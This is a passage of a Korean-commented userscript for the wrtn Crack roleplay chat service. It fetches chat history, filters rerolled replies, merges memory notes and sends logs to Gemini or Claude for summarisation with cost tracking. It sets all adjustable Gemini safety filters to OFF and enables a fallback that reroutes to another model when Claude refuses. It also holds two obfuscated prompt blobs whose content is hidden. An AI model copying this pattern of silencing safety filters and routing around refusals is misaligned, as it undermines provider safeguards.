    const isPack = it => /\(요약\)/.test(it.key);
    for (const d of splitSections(delta)) {
      let old = list.find(s => s.key === d.key);
      if (!old) { old = { key: d.key, body: '' }; list.push(old); }
      const o = itemBlocks(old.body), n = itemBlocks(d.body);
      if (!n.items.length && !o.items.length) { old.body = d.body; continue; }
      if (n.head.some(l => l.trim() && !isNone(l))) o.head = n.head;
      const guard = roomy && d.key === '날짜로그';
      const packing = guard && n.items.some(it => isPack(it) && !o.items.some(x => itemKey(x.key) === itemKey(it.key)));
      for (const it of n.items) {
        const i = o.items.findIndex(x => itemKey(x.key) === itemKey(it.key) || (d.key === '인물' && sameName(x.key, it.key)));
        if (packing && (it.del || (isPack(it) && i < 0))) continue;
        // ponytail: 짧아진 사건은 새 정보가 있어도 예전 글을 둠. 고친 내용이 안 들어가면 그 사건만 직접 고치기.
        if (guard && i >= 0 && !it.del && it.lines.join('').length < o.items[i].lines.join('').length) continue;
        if (it.del) { if (i >= 0) o.items.splice(i, 1); }
        else if (i >= 0) o.items[i] = it; else o.items.push(it);
      }
      old.body = [...o.head, ...o.items.flatMap(x => x.lines)].join('\n').trim();
    }
    return joinSections(list.filter(s => s.body.trim()));
  }

  // ══════════════════════════════════════════════════════════════
  // 6. 크랙 대화 읽기 · Gemini 정리 · 메시지 수정
  // ══════════════════════════════════════════════════════════════
  // 대화 목록 한 쪽(최신부터 50개). crack-api가 안 되면(404·405·5xx·네트워크) contents-api에서 같은 목록을 읽습니다.
  const API_A = 'https://crack-api.wrtn.ai/crack-gen/v3/chats/', API_B = 'https://contents-api.wrtn.ai/character-chat/v3/chats/';
  const serverDown = e => /HTTP (404|405|5\d\d)|네트워크|시간이 초과/.test(String(e?.message || e));
  async function crackGet(path) {
    try { return await crack('GET', API_A + path); }
    catch (e) { if (!serverDown(e)) throw e; return crack('GET', API_B + path); }
  }
  async function listPage(chatId, cursor) {
    const res = await crackGet(`${chatId}/messages?limit=${READ_PAGE}` + (cursor ? `&cursor=${encodeURIComponent(cursor)}` : ''));
    const data = res?.data || res;
    if (!Array.isArray(data?.messages)) throw new Error('대화 목록 형식을 알 수 없어요.');
    return { list: data.messages, next: data.nextCursor == null || data.hasNext === false ? '' : String(data.nextCursor) };
  }
  const sortOld = list => { const seen = new Set(); list = list.filter(m => { const id = msgId(m); if (!id) return true; if (seen.has(id)) return false; seen.add(id); return true; });
    return list.every(m => m.createdAt) ? [...list].sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt)) : [...list].reverse(); };
  // 크랙은 리롤로 버린 답도 목록에 남깁니다. 가장 새 메시지에서 parentTurnId를 따라 올라가며 실제로 이어진 줄만 남겨요.
  //   turnId가 없거나 겹치면 거기서 멈추고, 멈춘 곳보다 오래된 메시지는 그대로 둡니다(모르면 지우지 않음).
  function liveLine(list) {
    const chat = list.filter(isChat), n = new Map();
    for (const m of chat) if (m.turnId) n.set(String(m.turnId), (n.get(String(m.turnId)) || 0) + 1);
    const one = m => !!m?.turnId && n.get(String(m.turnId)) === 1;
    const byTurn = new Map(chat.filter(one).map(m => [String(m.turnId), m]));
    let m = chat[chat.length - 1];
    if (!one(m)) return list;
    const keep = new Set(); let oldest = m;
    while (m && one(m) && !keep.has(m)) { keep.add(m); oldest = m; m = m.parentTurnId ? byTurn.get(String(m.parentTurnId)) : null; }
    const cut = list.indexOf(oldest);
    return list.filter((x, i) => i < cut || keep.has(x) || !isChat(x));
  }
  // 채팅에 안 넣기(ETC만): 노트를 채팅에서 빼고 여기(기기)에만 보관합니다. 켜면 직전 AI 답변에 다시 넣어요.
  const parkedOf = async chatId => { try { const p = JSON.parse(String(await getValue('parked:' + chatId, '')) || 'null'); return p?.memory ? { ...p, carrierId: '', parked: true } : null; } catch (_) { return null; } };
  const park = (chatId, memory, upto, turns, at) => setValue('parked:' + chatId, JSON.stringify({ memory, upto, turns, at: at || new Date().toISOString() }));
  async function readSinceLastNote(chatId, maxPages = 40) {
    const newestFirst = [], pk = await parkedOf(chatId);
    let cursor = '', note = null, reachedStart = false;
    for (let page = 0; page < maxPages; page++) {
      const { list, next } = await listPage(chatId, cursor);
      // 노트는 리롤로 밀려난 답에 있어도 찾습니다(직전 답을 리롤하면 노트가 거기 남아요). 다음에 최신 답으로 옮겨져요.
      for (const m of list) { newestFirst.push(m); if (!note) note = parseNote(m); }
      // 노트를 최신 답변으로 옮기면 upto(정리 끝 메시지)는 노트보다 한참 앞에 있어요. 거기까지 읽어야 새 대화 턴을 제대로 셉니다.
      const nt = note || pk;
      if (nt && newestFirst.some(m => msgId(m) === nt.upto)) break;
      cursor = next;
      if (!cursor) { reachedStart = true; break; }
    }
    if (!note) note = pk;
    const all = liveLine(sortOld(newestFirst));
    let fresh = all;
    if (note) {
      const idx = all.findIndex(m => msgId(m) === note.upto), at = Date.parse(note.at);
      // upto 메시지가 지워졌으면(리롤 등) 정리한 시각 뒤 메시지를 새 대화로 봅니다.
      if (idx >= 0) fresh = all.slice(idx + 1);
      else if (at && all.every(m => m.createdAt)) fresh = all.filter(m => Date.parse(m.createdAt) > at);
      else fresh = all.slice(all.findIndex(m => msgId(m) === note.carrierId) + 1);
    }
    fresh = fresh.filter(isChat);
    return { note, fresh, all, complete: !!note || reachedStart };
  }

  // 새 노트에 없는 【인물】 블록은 예전 노트의 블록을 그대로 되살립니다. 25턴 동안 안 나온 인물도 잊지 않게.
  function keepMissingPeople(newMem, oldMem) {
    const oldBody = splitSections(oldMem).find(x => x.key === '인물')?.body || '';
    if (!isNewPeople(oldBody)) return { memory: newMem, kept: [] };
    const blocks = new Map(); let cur = null;
    for (const l of oldBody.split('\n')) {
      const h = l.trim().match(/^【(.+?)】/);
      if (h) { cur = h[1].trim(); blocks.set(cur, [l.trim()]); continue; }
      if (cur && l.trim()) blocks.get(cur).push(l.trim());
    }
    const list = splitSections(newMem), sec = list.find(x => x.key === '인물');
    // 새 노트에 "태정"으로 있으면 예전 "주태정" 블록을 또 붙이지 않습니다.
    const have = personsIn(sec?.body || '').map(x => x.name);
    const kept = [...blocks.keys()].filter(n => !have.some(h => sameName(h, n)));
    if (!kept.length) return { memory: newMem, kept };
    const add = kept.map(n => blocks.get(n).join('\n')).join('\n');
    if (sec) sec.body = (sec.body.trim() ? sec.body.trim() + '\n' : '') + add; else list.push({ key: '인물', body: add });
    return { memory: joinSections(list), kept };
  }
  // 같은 사람이 여러 이름 블록으로 나뉘었으면 하나로(네이선 힐 · 네이선 · Nathan · Nathan Hill). 롤플엔 동명이인이 없다고 보고 sameName으로 묶어요.
  //   남길 이름: 기존 노트에 있던 이름 → 한글 이름 → 더 긴 이름 순. 지운 블록의 줄 중 새 내용만 남길 블록 뒤에 붙여요(프로필 줄은 남길 쪽 것만).
  function mergeDupPeople(memory, prevMemory) {
    const list = splitSections(memory), sec = list.find(x => x.key === '인물'); if (!sec) return { memory, merged: [] };
    const head = [], blocks = []; let cur = null;
    for (const l of sec.body.split('\n')) { const h = l.trim().match(/^【(.+?)】/); if (h) { cur = { name: h[1].trim(), lines: [l] }; blocks.push(cur); continue; } (cur ? cur.lines : head).push(l); }
    const prevNames = personsIn(splitSections(prevMemory || '').find(x => x.key === '인물')?.body || '').map(x => x.name);
    const rank = n => (prevNames.includes(n) ? 100 : 0) + (/[가-힣]/.test(n) ? 10 : 0) + Math.min(9, String(n).length / 3);
    const merged = [];
    for (let i = 0; i < blocks.length; i++) for (let j = i + 1; j < blocks.length; j++) {
      const alts = blk => [...String(blk.lines[0]).matchAll(/(?:별명|가명|본명|새 이름|다른 이름|개명)\s*[:：]?\s*([^\s·,()（）「」]{2,20})/g)].map(m => m[1]);
      const A = blocks[i], B = blocks[j]; if (!sameName(A.name, B.name) && !alts(A).includes(B.name) && !alts(B).includes(A.name)) continue;
      const keep = rank(A.name) >= rank(B.name) ? A : B, drop = keep === A ? B : A;
      for (const l of drop.lines.slice(1)) if (l.trim() && !/^\s*프로필\s*[:：]/.test(l) && !keep.lines.includes(l)) keep.lines.push(l);
      merged.push(`${drop.name} → ${keep.name}`); blocks.splice(blocks.indexOf(drop), 1);
      if (drop === A) { i--; break; } j--;
    }
    if (!merged.length) return { memory, merged };
    sec.body = [...head, ...blocks.flatMap(b => b.lines)].join('\n');
    return { memory: joinSections(list), merged };
  }
  // 명대사 칸에서 [USER] 메시지에만 있는 대사(사용자 캐릭터 대사)를 뺍니다. 바로 아래 번역·장면 줄도 같이.
  function dropUserQuotes(memory, freshMessages) {
    const users = new Set(personsIn(splitSections(memory).find(x => x.key === '인물')?.body || '').filter(x => x.isUser).map(x => x.name));
    const norm = t => String(t).replace(/[\s"“”'‘’.,!?…~\-—]/g, '');
    const pick = role => norm(freshMessages.filter(m => msgRole(m) === role).map(m => stripBlocks(msgText(m))).join('\n'));
    const userText = pick('user'), aiText = pick('assistant');
    let inQuotes = false, dropNext = false;
    return String(memory).split('\n').filter(l => {
      const h = l.match(/^(?:##(?!#)|■)\s*(.+?)\s*$/);
      if (h) { inQuotes = h[1] === '명대사'; dropNext = false; return true; }
      if (!inQuotes) return true;
      if (/^\s*-?\s*(?:번역|장면)\s*[:：]/.test(l)) return !dropNext; // 바로 위 대사를 따라갑니다
      const q = l.match(/["“](.+?)["”]/), key = q ? norm(splitTr(q[1])[0]) : '', who = (l.match(/^\s*-?\s*(.+?)\s*(?:→|->|[:：])/) || [])[1]?.trim();
      dropNext = (!!who && users.has(who)) || (!!key && key.length >= 4 && userText.includes(key) && !aiText.includes(key));
      return !dropNext;
    }).join('\n');
  }
  // 근거에 영어 대사 대신 그 옆 한국어 번역만 따 온 경우, 원문에서 바로 앞 영어 대사를 찾아 "영어 (번역)"으로 고칩니다.
  //   원문에서 못 찾으면 그대로 둡니다(지어내지 않음).
  function fixTrQuotes(memory, freshMessages) {
    const texts = freshMessages.map(m => stripBlocks(msgText(m)));
    //   번역 표시((·*·_)나 줄바꿈을 사이에 두고 영어 대사 바로 뒤에 붙은 한국어만 번역으로 봅니다(영어 대사 뒤 지문은 X).
    const before = /["“]([^"“”\n]*[A-Za-z][^"“”\n]*)["”][*_]?(?:\s*[(（*_]|[ \t]*\n\s*[(（*_]?)\s*["“]?$/;
    const enOf = ko => { ko = ko.trim(); if (!ko || /[A-Za-z]/.test(ko) || !/[가-힣]/.test(ko)) return '';
      for (const t of texts) { const i = t.indexOf(ko); if (i < 0) continue;
        const en = t.slice(Math.max(0, i - 600), i).match(before); if (en && !/[가-힣]/.test(en[1])) return `${en[1].trim()} (${ko})`; }
      return ''; };
    // 근거 줄의 "대사" 조각마다 고칩니다. 「지문」은 건드리지 않아요.
    return String(memory).split('\n').map(l => !/^\s*-?\s*근거\s*[:：]/.test(l) ? l
      : l.replace(/「[^」]*」|["“]([^"“”]+)["”]/g, (all, d) => { if (d == null) return all; const f = enOf(d); return f ? `"${f}"` : all; })).join('\n');
  }
  // AI에게 보낼 대화 본문: 이미지 마크다운·이미지 주소만 있는 줄은 빼서 길이를 아낍니다(이야기 글은 그대로).
  const cleanLog = t => stripBlocks(t).replace(/!\[[^\]\n]*\]\([^)\n]*\)/g, '').replace(/^\s*https?:\/\/\S+\.(?:png|jpe?g|gif|webp|avif)(?:\?\S*)?\s*$/gim, '').replace(/\n{3,}/g, '\n\n').trim();
  // 메시지마다 턴 번호를 붙여 보냅니다([12턴 · AI]). 근거 줄이 "몇 턴" 원문인지 적을 수 있게. USER 메시지에서 새 턴이 시작돼요.
  function buildInput(prevMemory, freshMessages, fixed = '', edited = [], from = 1) {
    let t = from - 1;
    const log = freshMessages.length ? freshMessages.map(m => { const u = msgRole(m) === 'user'; if (u) t++;
      return `[${Math.max(t, 1)}턴 · ${u ? 'USER' : 'AI'}]\n${cleanLog(msgText(m))}`; }).join('\n\n')
      : '(새 로그 없음 — 기존 기억을 지침의 형식·규칙대로 다시 정리만 한다. 내용을 빼거나 지어내지 않는다. 근거가 없는 항목은 근거 줄 없이 둔다.)';
    const mine = edited.length ? `\n\n[사용자가 직접 고친 칸]\n${edited.join(', ')} — 기존 기억의 이 칸 내용은 사용자가 손으로 고친 것이라 사실로 그대로 두고, 새 로그로 바뀐 것만 보탠다.` : '';
    const size = prevMemory ? `\n\n[현재 노트 크기] 채팅 주입 기준 ${fmt(stripProof(prevMemory).length)}자 / 한도 ${fmt(NOTE_LIMIT)}자` : '';
    return `[고정 설정]\n${fixed || '(없음)'}${mine}${size}\n\n[기존 기억]\n${prevMemory || '(없음)'}\n\n[새 RP 로그]\n${log}`;
  }
  const editedKeys = async chatId => { try { return JSON.parse(String(await getValue('edited:' + chatId, '[]')) || '[]'); } catch (_) { return []; } };
  // 단계별 정리: 기존 노트는 프로그램이 들고 있고, AI는 바뀐 항목만 냅니다(mergeNote가 끼워 넣음).
  const DELTA_RULE = `\n\n[출력 — 이번엔 바뀐 것만] 이 규칙이 위 [매번 할 일]·[출력]과 "노트 전체를 쓴다"는 다른 모든 안내보다 우선한다.
- 기존 기억은 프로그램이 그대로 보관한다. 새 로그 때문에 달라진 것만 쓴다. 출력하지 않은 칸·항목은 기존 그대로 남는다.
- 항목 = "▸ 제목" 블록 하나, 또는 인물 칸의 "【이름】" 블록 하나(그 아래 줄 전부).
- 바뀌거나 보탤 항목은 그 항목 전체를 다시 쓴다(안 바뀐 줄·근거 줄도 포함). 같은 항목이면 제목·이름을 기존 기억과 한 글자도 다르지 않게 쓴다. 제목을 바꾸면 새 항목이 하나 더 생긴다.
- 새 항목은 새 제목으로 쓴다. 지울 항목(끝난 상태, 다른 항목에 합친 것, 닫혀서 옮긴 것)은 제목 줄만 쓰고 끝에 " (삭제)"를 붙인다. 예: "▸ [2026.03.14-세라가 레온에게 사과함] (삭제)", "【이름】 (삭제)".
- ▸·【】 항목이 없는 칸(줄거리·서사 고리 등)은 바뀌었으면 칸 전체를 다시 쓴다.
- ■ 줄거리와 ■ 현재상태의 "▸ 기준 시점·장소"는 매번 쓴다.
- 날짜로그를 (요약)으로 묶을 때는 묶은 새 항목을 쓰고, 묶여 들어간 옛 사건마다 "(삭제)" 줄을 쓴다.
- 감정선은 새 단계가 생긴 "▸ 인물 → 상대" 항목만, 기존 단계까지 포함해 전체를 쓴다.
- ■ 칸 이름 줄은 그 칸에서 하나라도 출력할 때만 쓴다.`;
  async function buildSystem(delta = false) {
    const off = await offSections();
    return PROMPT.replace(/\{LIMIT\}/g, fmt(NOTE_LIMIT)).replace(/\{CYCLE\}/g, cycle) + (off.length ? `\n\n[이번 정리에서 만들지 않는 칸] ${off.join('·')} — 이 칸은 출력하지 않는다.` : '') + (delta ? DELTA_RULE : '');
  }
  const cleanOut = t => String(t).replace(/^```\w*\n?|\n?```$/g, '').trim();

  // ── 다른 AI로 정리: 보내는 파일의 앞뒤 안내 · 받은 답 다듬기
  const EXT_HEAD = unveil('MYP82UWA4/6VsI7cr7JKhNH2ifDvUjhk3qei3NjjQY/l+U+Z0ZHekLIWge78h9zhg9X5Dd6tj9r820GBxtGD9sHBqKRvPIHr6Ybv+U+e54jYiIIWOD+N8P1NTZjBnd6mhxaB6tmA79VNmdyREtuVuoH8/Ybv+U+e2bjZlp4WgeTVhu7Ug+/NxrmUHBY4P4rI2U2D783BpIQS2vnfi9zVhu3qWca+sN60xoTE0UWGyP6SvpbclbZKg/Tnjuf7mfKJHDrfo8pPjfDZV2VDVw3epbbd9PdBT4nN+pnfgRLclbaG1slPj97TUlvBkqXZkMaC9M1FgfHiko6+Ehrc2c+NzfBNg/bdwZKl8IGA19GBxNlPmMGd3qaH9N2D4uVFPz9Skoyu2oWOQ4TE0UWG7u+TlL7clbZKg/zQjuf7mfKJHDoAGEqDxu2J1Mee5LUSa9+u/4Pq8Div2JjOsd6Jq93m74rM+U2E98HAuIgS2srrjd/RhsrOWcGhhNm9zkFBgdzVT57Zsdmam9r370GG1fWE4eXBuawSFIj5wU2J1Nee5JnZlrYUSoL08UWBy/ZVDd62vtrK84rHzIHy8lkP0KaKFkhDQYH41YTexcGvsBIUie/xgfjZhNT9zrKhEBpKgvTAjsfGnuStEhIfFkiEwPFFgeTulbOj3aeqgeTFQ29eQVKTn4LagYqB5fVNidD7meqx2Yim3cvyQYDw9YTw4Q3epbra/f+KyulNg8TlxpKV36P2hOrJS02Dz+3GoazZjv6EwPBFgd3ZWcGWtN6r6k9cUFgjICY8DWFkc2Q+UlxQSU2E1fHBlbDZkeNPjcnhgfLyWRAPDXx5PipBKCspUk9EAxLcj6KB/P2G3fmE0+QN2YCk2v3/iufxTYPn/caehBLdzf+K4uFNg+HJwZWwEtr/5Yrn8Ybk1lcnBh4S3c3njOzJhuTWlbeGENiD34XT4U1HRVtVDREQ3pb2hMvESU2C4+UBEtuAvof32U2Ox8aZ2LAeEN6r3oTLxYnK71KVs5fcuauG8uVNif7fnt6tEtynvIHl9YbuyUF4TAMS27mDhvLVTY/V157vmRLclqeA3+WB8v1Pmfin2IiC3cPbTU2J78Oe44TerqLc2u9BT4/e657/oBDcr4KB8t2H1s1PmcqZ2bO62vfrQYbw4U+Z+KfYiIYWhsvlTY7my57kodmGstvu30GH1fSD7/kN3o2m3fnzitXxhs7vWcCqpd6994P90Y7M81KVsIbcpIKG6/1Nif7fmMqNHhDZkeKDxu2Oyuae7r3Zl74WV1JcIyo5KlI8Y3YNDwuByt1Nif7bmfKJHA==');
  const EXT_TAIL = unveil('MYPX8Y7NylKVtbrcuapKjeH5RYHyxlnGmJjeoPtPi9rdhuPykoyuHBLd6NuN98yB8vJZwayg2ZXmg/b9RYbI7JOfvm04VgoPFQgdGWVPRBB8f2ZzSjw1LDc5Uk9EJ9CmkhaGy+WH1N2E1NUnHxDehMFPjcnhZ43k2Q3fqLba9MON7uSA7O5zz6SIEtzS343J5U2D+eXBkqDwgYbxxIHj4WVfWR8CAgQYWlxPXFFNhMLdARLcrJOG6e1nh/vPUpWwitueimCM4f2J8NuZ36nRsKMWhs/0gdfZT7DODd60g9zYxmuB+NmE1P0N0LagFobs4Ibp7VVSmq2+3aqOhtbMjuXgrcWVjIbbvqWByPFNp9pPnt6t2Ii6FoDb4YfW6WVfWceFjNiH2lVBRSuA68ZZ74UQ2bTKg8bxTE1NnuK92ZyKFGBHjcrlgdbalbCqENm9zoTE1UWB1sqSvpbbvbJKhdH0ifDvUpKdm9y5q4bz3YbE8UZ4RBAPfn1iL08kIyFQUk9zTVJQONza74rnwID66pKEhhDYhNqF0tGOyNNSFEhfXx9YBRsEQBcIHAcVWRxESkJKgu3hifDTmdixEtuVuoH8xYHz2U+e2pHetIra8PtJgOnhg+/FDd6luhaB7dWB/8SE/f0N3qy2Fof39IHu8E+YzpXZvLLdy/NIQ0WA4/6VsI7cr7JKhMbhjv7LUpWlqhDeoeyD/dGOxNtSlbG2EN6L/oTy8Y7V+5nYsN6sjt3L80GB0/GE0tzAp4QS2snTjendgfXmVw==');
  // 받은 답: NOTE START~END 사이만, 코드블록·굵게·# 제목·*목록을 우리 형식으로 고칩니다.
  function normalizeImported(text) {
    let t = String(text).replace(/\r\n?/g, '\n');
    const a = t.search(/===\s*NOTE START\s*===/), b = t.search(/===\s*NOTE END\s*===/);
    if (a >= 0) t = t.slice(t.indexOf('\n', a) + 1, b > a ? b : undefined);
    // "계속"으로 나눠 받은 답이 이어 붙어 있으면 중간 표시·코드블록을 지웁니다.
    t = t.replace(/^.*===\s*NOTE (START|END)\s*===.*$/gm, '').replace(/^\s*```\w*\s*$/gm, '');
    t = t.split('\n').map(l => l
      .replace(/\*\*(.+?)\*\*/g, '$1')
      .replace(/^\s*#{1,3}\s*(?=■)/, '')
      .replace(/^\s*#{2}\s+(?!#)/, '■ ')
      .replace(/^\s*#{3,}\s+/, '▸ ')
      .replace(/^(\s*)[*•]\s+/, '$1- ')).join('\n');
    const first = t.search(/^\s*■/m);
    if (first > 0) t = t.slice(first);
    return t.replace(/\n{3,}/g, '\n\n').trim();
  }
  function checkImported(t) {
    const keys = [...t.matchAll(/^\s*■\s*(.+?)\s*$/gm)].map(m => m[1]);
    if (!keys.length) return '■ 칸 제목이 하나도 없어요. AI 답의 코드블록 안 내용을 통째로 붙여 넣어 주세요.';
    if (!keys.some(k => ['인물', '줄거리', '현재상태', '날짜로그'].includes(ALIAS[k] || k))) return `알아볼 수 있는 칸이 없어요(받은 칸: ${keys.slice(0, 4).join(', ')}). 파일을 다시 받아 AI에게 보내 주세요.`;
    if (t.length < 80) return '내용이 너무 짧아요. 답이 중간에 끊겼다면 AI에게 "계속"이라고 보내고 이어진 답까지 함께 붙여 넣어 주세요.';
    return '';
  }
  async function summarize(prevMemory, freshMessages, fixed = '', edited = [], from = 1, delta = false) {
    const model = String(await getValue('model', DEFAULT_MODEL)).trim() || DEFAULT_MODEL;
    const input = buildInput(prevMemory, freshMessages, fixed, edited, from), system = await buildSystem(delta);
    const out = isClaude(model) ? await askClaude(model, system, input) : await askGemini(model, system, input);
    summarize.last = { model, inTok: out.inTok, outTok: out.outTok };
    if (!out.text) throw new Error('AI가 빈 답을 보냈어요.');
    return cleanOut(out.text);
  }
  // 정리 말고 따로 만드는 것(명대사·폰)에 쓰는 AI 호출. 설정한 모델 그대로, 비용은 정리 기록에 함께 적어요.
  async function askModel(system, input, label) {
    const model = String(await getValue('model', DEFAULT_MODEL)).trim() || DEFAULT_MODEL;
    // 503(수요 폭주)·429·5xx처럼 잠깐 뒤 되는 오류는 자동으로 두 번까지 다시 시도합니다
    let out; const waits = [4, 10];
    for (let k = 0; ; k++) {
      try { out = isClaude(model) ? await askClaude(model, system, input) : await askGemini(model, system, input); break; }
      catch (e) {
        if (k >= waits.length || !/HTTP (429|500|502|503|504)\b/.test(String(e?.message))) throw e;
        toast(`AI가 바빠요. ${waits[k]}초 뒤 다시 시도해요… (${k + 1}/${waits.length})`, 'info', 4000);
        await new Promise(r => setTimeout(r, waits[k] * 1000));
      }
    }
    const chatId = chatIdFromPath();
    if (chatId) { await recordUsage(chatId, { at: Date.now(), from: 0, to: 0, label, chars: out.text.length, model, inTok: out.inTok, outTok: out.outTok }); usage = await usageOf(chatId); }
    if (!out.text) throw new Error('AI가 빈 답을 보냈어요.');
    return cleanOut(out.text);
  }
  // 답이 출력 한도에서 잘림 → run()이 범위를 반으로 줄여 한 번 더 해요.
  const cutError = () => Object.assign(new Error('정리 결과가 너무 길어서 잘렸어요. 노트 크기를 줄여 주세요.'), { cut: true });
  // 한 번에 받으면 긴 정리에서 서버가 3분쯤에 끊는 일이 있어 스트리밍(SSE)으로 끝까지 받습니다. 끝맺음 표시 없이 끝나면 실패로 봅니다.
  async function askGemini(model, system, input) {
    const key = String(await getValue('apiKey', '')).trim();
    if (!key) throw new Error('설정에서 Gemini API 키를 먼저 넣어 주세요.');
    const raw = await requestRaw('POST',
      `https://generativelanguage.googleapis.com/v1beta/models/${encodeURIComponent(model)}:streamGenerateContent?alt=sse`,
      { headers: { 'x-goog-api-key': key }, timeout: 600000, onProgress: raw => updateProg(raw),
        body: { systemInstruction: { parts: [{ text: system }] },
                contents: [{ role: 'user', parts: [{ text: input }] }],
                // 창작 RP 정리라 조절 가능한 필터는 끔(공식 설정). 끌 수 없는 금지 항목은 그대로 막혀요.
                safetySettings: ['HARASSMENT', 'HATE_SPEECH', 'SEXUALLY_EXPLICIT', 'DANGEROUS_CONTENT', 'CIVIC_INTEGRITY'].map(c => ({ category: 'HARM_CATEGORY_' + c, threshold: 'OFF' })),
                generationConfig: { maxOutputTokens: 65536 } } });
    let text = '', finish = '', u = {};
    for (const line of raw.split('\n')) {
      if (!line.startsWith('data:')) continue;
      let j; try { j = JSON.parse(line.slice(5)); } catch (_) { continue; }
      const c = j.candidates?.[0];
      for (const p of c?.content?.parts || []) if (!p.thought && p.text) text += p.text;
      if (c?.finishReason) finish = c.finishReason;
      if (j.usageMetadata) u = j.usageMetadata;
      if (j.promptFeedback?.blockReason) finish = j.promptFeedback.blockReason;
    }
    if (/MAX_TOKENS/i.test(finish)) throw Object.assign(cutError(), { partial: text.trim() });
    if (/SAFETY|PROHIBITED|BLOCKLIST|RECITATION/i.test(finish)) throw new Error(`AI 안전 필터가 막았어요(${finish}). 정리할 턴 범위를 줄이거나 다른 모델로 해 주세요.`);
    if (!finish) throw new Error('AI 답이 끝까지 오지 않았어요(연결이 끊겼어요). 다시 해 주세요.');
    return { text: text.trim(), inTok: Number(u.promptTokenCount) || 0, outTok: (Number(u.candidatesTokenCount) || 0) + (Number(u.thoughtsTokenCount) || 0) };
  }
  // Claude Messages API. 확장 프로그램 요청이라 SDK 대신 HTTP로 직접 부릅니다.
  //   Fable·Opus 5 계열은 안전 거절이 나면 서버가 알아서 다른 모델로 넘기도록(fallbacks) 켜 둡니다.
  async function askClaude(model, system, input) {
    const key = String(await getValue('claudeKey', '')).trim();
    if (!key) throw new Error('설정에서 Claude API 키를 먼저 넣어 주세요.');
    const fallback = /^claude-(fable|opus-5)/.test(model);
    // 긴 정리는 몇 분 걸려서 한 번에 받으면 연결이 끊기기 쉬워요. Gemini처럼 스트리밍(SSE)으로 끝까지 받습니다.
    const raw = await requestRaw('POST', 'https://api.anthropic.com/v1/messages', {
      timeout: 600000, onProgress: raw => updateProg(raw),
      headers: { 'x-api-key': key, 'anthropic-version': '2023-06-01', 'anthropic-dangerous-direct-browser-access': 'true',
                 ...(fallback ? { 'anthropic-beta': 'server-side-fallback-2026-07-01' } : {}) },
      body: { model, max_tokens: 64000, stream: true, system, messages: [{ role: 'user', content: input }], ...(fallback ? { fallbacks: 'default' } : {}) } });
    let text = '', stop = '', inTok = 0, outTok = 0;
    for (const line of raw.split('\n')) {
      if (!line.startsWith('data:')) continue;
      let j; try { j = JSON.parse(line.slice(5)); } catch (_) { continue; }
      if (j.type === 'message_start') inTok = Number(j.message?.usage?.input_tokens) || inTok;
      else if (j.type === 'content_block_delta' && j.delta?.type === 'text_delta') text += j.delta.text;
      else if (j.type === 'message_delta') { stop = j.delta?.stop_reason || stop; outTok = Number(j.usage?.output_tokens) || outTok; }
      else if (j.type === 'error') throw new Error('Claude 오류 · ' + (j.error?.message || '알 수 없음'));
    }
    if (stop === 'refusal') throw new Error('Claude가 이 대화 정리를 거절했어요. 다른 모델로 다시 해 주세요.');
    if (stop === 'max_tokens') throw Object.assign(cutError(), { partial: text.trim() });
    if (!stop) throw new Error('AI 답이 끝까지 오지 않았어요(연결이 끊겼어요). 다시 해 주세요.');
    return { text: text.trim(), inTok, outTok };
  }

  // 공식 단가 (USD / 100만 토큰, 입력·출력). 생각 토큰은 출력 단가로 계산됩니다.
  function priceOf(model, inTok = 0) {
    const m = String(model);
    if (/^gemini-3\.[678]-flash$/.test(m)) return Date.now() < Date.UTC(2027, 0, 1) ? [0.75, 3.75] : [1.5, 7.5];
    if (m === 'gemini-3.5-flash') return [1.5, 9];
    if (m === 'gemini-3.5-flash-lite') return [0.3, 2.5];
    if (m === 'gemini-3.1-flash-lite') return [0.25, 1.5];
    if (/^gemini-3\.1-pro/.test(m)) return [2, 12];
    if (/^claude-(fable|mythos)-5/.test(m)) return [10, 50];
    if (m === 'claude-opus-5-5') return [4, 20];
    if (/^claude-opus-(5|4-[678])$/.test(m)) return [5, 25];
    if (m === 'claude-sonnet-5' || m === 'claude-sonnet-5-5') return [2, 10];
    if (m === 'claude-haiku-5-5') return inTok > 100000 ? [0.5, 2.5] : [0.1, 0.5]; // 입력 10만 토큰 넘으면 비싸져요
    if (/^claude-haiku-4-5/.test(m)) return [1, 5];
    return null;
  }
  async function recordUsage(chatId, run) {
    const price = priceOf(run.model, run.inTok);
    run.usd = price ? (run.inTok * price[0] + run.outTok * price[1]) / 1e6 : null;
    let list = [];
    try { list = JSON.parse(String(await getValue('usage:' + chatId, '[]')) || '[]'); } catch (_) {}
    list.push(run);
    await setValue('usage:' + chatId, JSON.stringify(list.slice(-60)));
  }
  async function usageOf(chatId) { try { return JSON.parse(String(await getValue('usage:' + chatId, '[]')) || '[]'); } catch (_) { return []; } }
  const won = usd => Math.round(usd * 1400);

  // 근거 인용이 실제 로그에 있는지 확인 (공백 차이는 무시)
  // 지어낸 호칭·별명 찾기: 인물 칸의 「호칭」·"별명 ○○" 가운데 기존 노트에도, 이번 원문에도 없는 말.
  function checkNames(memory, freshMessages, prevMemory) {
    const norm = s => String(s).replace(/\s+/g, '');
    const source = norm(freshMessages.map(m => stripBlocks(msgText(m))).join('\n')), prev = norm(prevMemory || '');
    const body = ['인물', '호칭·말투'].map(k => splitSections(memory).find(x => x.key === k)?.body || '').join('\n');
    const words = new Set();
    for (const l of body.split('\n')) {
      if (/^\s*-?\s*(근거|번역)\s*[:：]/.test(l)) continue;
      // 「sweetheart (자기)」처럼 번역이 붙으면 원문 쪽만 확인합니다.
      for (const m of l.matchAll(/「([^」]{1,40})」/g)) words.add(m[1].replace(/\s*[(（][^)）]*[)）]\s*$/, '').trim());
      for (const m of l.matchAll(/별명\s+([^\s·,()（）]{1,20})/g)) words.add(m[1].trim());
    }
    return [...words].filter(w => w && !source.includes(norm(w)) && !prev.includes(norm(w)));
  }
  // 지어낸 호칭 지우기: 인물·호칭 칸에서 「그 말」(번역 괄호 포함)과 "별명 그 말"만 빼고, 말투·태도는 남깁니다.
  //   "네이선 힐 → 루루: 「Little rabbit (꼬마 토끼)」·반말 · 태도" → "네이선 힐 → 루루: 반말 · 태도"
  function dropNames(sections, words) {
    const re = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    return sections.map(s => !['인물', '호칭·말투'].includes(s.key) ? s : { ...s, body: words.reduce((b, w) => b
      .replace(new RegExp(`「${re(w)}(?:\\s*[(（][^)）]*[)）])?」\\s*[·,]?\\s*`, 'g'), '')
      .replace(new RegExp(`\\s*[·,]?\\s*별명\\s+${re(w)}(?=[\\s·,()（）]|$)`, 'g'), ''), s.body) });
  }
